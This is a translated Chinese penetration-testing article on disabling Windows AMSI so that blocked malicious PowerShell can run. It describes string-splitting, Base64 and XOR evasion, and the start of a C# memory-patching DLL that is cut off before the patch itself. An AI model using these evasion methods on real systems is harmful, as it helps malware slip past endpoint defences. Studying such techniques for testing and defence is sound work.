# 如何绕过AMSI执行任意恶意PowerShell代码
##### 译文声明
本文是翻译文章，文章来源：github.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 概述
在此前，我曾经介绍过如何从本地管理员用户手动获取SYSTEM
Shell。在渗透测试期间，这是一个非常有价值的步骤，但往往会在最后面进行，因为这一步的前提是已经获得了目标主机的访问权限。  
而我们本文介绍的方法，对于渗透测试的早期会更有用一些，因为AMSI（反恶意软件扫描接口）可能会对获取Shell的过程以及后期漏洞利用（Post-exploitation）阶段造成麻烦。
## 关于AMSI
AMSI，即ANTI MALWARE SCAN INTERFACE（反恶意软件扫描接口）。顾名思义，其作用就是扫描、检测并阻止任何有害的程序。  
其作用的直观体现如下图所示：  
如果大家拥有Windows环境中渗透测试的经验，可能会发现几乎所有公开的脚本都会出现这样的错误，比如Nishang、Empire、PowerSploit和其他比较知名的PowerShell脚本。  
而这一错误的产生，就是AMSI防护的结果。
## AMSI的工作原理
AMSI使用基于字符串的检测方法，来确定PowerShell代码是否为恶意代码。  
示例如下：  
其中，amsiutils这个关键词被禁止了。如果在名称中包含这个单词，那么就会被AMSI识别为恶意代码。
## 如何绕过字符串检测
大家都知道，字符串检测很容易绕过，只要对使用的字符串稍加改动就可以。对其进行编码，或者将其拆分为块后再重新组合，就可以实现绕过。  
以下是绕过字符串检测，执行“被禁止”代码的3种方法：  
简单地将单词分成两部分，就足以欺骗这种检测方案。我们在混淆过程中，发现了很多这样的情况。但在大多数情况下，这种方法可能会失败。  
在某些情况下，通过对被禁用的代码进行Base 64解码，就可以绕过这种方案。  
当然，也可以使用XOR来欺骗AMSI，并在运行时将字符串解码到内存中。这是更为有效的方式，因为需要更高级的技术来对其进行检测。  
上述所有技术，都是使用“迂回战术”逃避字符串检测，但我们不希望如此。我们希望这些脚本能以原始的状态来执行，而原始的状态就是指AMSI会阻止其运行的状态。
## 通过内存修补绕过AMSI
这才是真正意义的“绕过”。在严格意义上，我们并没有进行“绕过”，而是直接禁用了它。  
在AMSI中，有一些函数是在运行PowerShell代码之前执行的（从PowerShell
v3.0开始），因此，为了完全绕过AMSI以执行任意PowerShell恶意软件，我们需要对这些函数进行内存修补（Memory
Patch），以实现对AMSI的完全禁用。  
我在网上找到的最佳方案是：  。这一方案适用于最新版本的Windows。  
有关于这种内存修补方法的详细信息，请参考上面的这篇文章，我不会在此过多涉及。在我们的研究中，主要对这种技术进行武器化，并且将其应用于PowerShell脚本中，从而实现对它的实际利用。  
我们将使用上述技术，编译一个C# DLL，然后在PowerShell会话中加载并执行此代码，完全禁用AMSI。
    using System;
    using System.Runtime.InteropServices;
    namespace Bypass
    {
        public class AMSI
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
            static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
            public static int Disable()
            {